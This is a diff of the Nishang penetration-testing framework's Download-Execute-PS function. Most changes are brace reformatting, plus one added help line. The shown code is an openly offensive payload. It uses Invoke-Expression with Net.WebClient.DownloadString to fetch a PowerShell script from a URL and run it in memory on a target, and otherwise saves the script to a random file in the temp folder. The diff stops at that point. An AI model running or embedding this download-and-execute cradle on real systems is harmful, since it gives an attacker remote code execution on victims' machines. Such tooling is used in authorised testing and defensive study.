@@ -1,11 +1,13 @@
 
-function Download-Execute-PS{
+function Download-Execute-PS
+{
 <#
 .SYNOPSIS
 Nishang Payload which downloads and executes a powershell script.
 
 .DESCRIPTION
 This payload downloads a powershell script from specified URL and then executes it on the target.
+Use the -nowdownload option to avoid saving the script on the target. Otherwise, the script is saved with a random filename.
 
 .PARAMETER ScriptURL
 The URL from where the powershell script would be downloaded.
@@ -40,13 +42,16 @@ https://github.com/samratashok/nishang
         [Switch]
         $nodownload
     )
-    if ($nodownload -eq $true){
+    if ($nodownload -eq $true)
+    {
         Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
-        if($Arguments){
+        if($Arguments)
+        {
             Invoke-Expression $Arguments
         }
     }
-    else{
+    else
+    {
         $rand = Get-Random
         $webclient = New-Object System.Net.WebClient
         $file1 = "$env:temp\$rand.ps1"
